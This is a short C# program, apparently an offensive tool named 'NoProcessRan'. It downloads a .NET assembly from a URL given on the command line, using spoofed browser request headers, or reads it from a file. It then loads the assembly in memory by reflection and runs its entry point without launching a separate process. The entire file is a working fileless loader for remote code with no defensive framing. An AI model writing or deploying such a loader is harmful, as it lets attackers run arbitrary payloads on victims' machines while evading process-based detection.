using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace NoProcessRan
{
    internal class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
            if (args.Length != 0)
            {
                string argument = args[0];
                byte[] bytes;
                if (argument.Remove(4) == "http")
                {
                    HttpClient client = new HttpClient();
                    client.DefaultRequestHeaders.Add("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36");
                    client.DefaultRequestHeaders.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8");
                    client.DefaultRequestHeaders.Add("Accept-Encoding", "gzip, deflate, br");
                    HttpResponseMessage response = client.GetAsync(argument).Result;
                    bytes = response.Content.ReadAsByteArrayAsync().Result;
                }
                else
                {
                    bytes = File.ReadAllBytes(argument);
                }
                Assembly assmebly = Assembly.Load(bytes);
                assmebly.EntryPoint.Invoke(null, new object[0]);
            }
        }
    }
}
